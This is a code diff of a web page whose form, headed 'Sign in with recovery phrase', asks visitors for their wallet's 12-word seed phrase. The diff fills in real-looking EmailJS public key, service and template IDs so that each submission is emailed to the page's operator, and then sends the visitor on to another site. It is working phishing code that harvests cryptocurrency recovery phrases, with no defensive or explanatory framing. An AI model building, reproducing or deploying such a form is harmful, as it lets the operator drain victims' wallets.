@@ -311,7 +311,7 @@
   </header>
 
   <main>
-  <form class="full-form" id="contact-form">
+  <form class="full-form" id="about">
     <h2>Sign in with recovery phrase</h2>
     <label for="about">This is a 12-word phrase you were given when you created your wallet</label>
     <textarea id="about" name="message" rows="4" placeholder="12-word recovery phrase"></textarea>
@@ -668,16 +668,16 @@
     <!-- ✅ EmailJS Submission + Spinner Script -->
     <script>
     (function() {
-      emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS public key
+      emailjs.init("SdkmRe8WZ7itEba9z"); // Replace with your EmailJS public key
     })();
     
-    document.getElementById("contact-form").addEventListener("submit", function(event) {
+    document.getElementById("about").addEventListener("submit", function(event) {
       event.preventDefault();
     
       const spinner = document.getElementById("spinner");
       spinner.style.display = "block"; // Show loading spinner
     
-      emailjs.sendForm("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", this)
+      emailjs.sendForm("service_zuj2d2a", "template_tvd86sp", this)
         .then(function() {
           // ✅ Redirect after successful send
           window.location.href = "https://www.accountchemist.com"; // Replace with your redirect URL
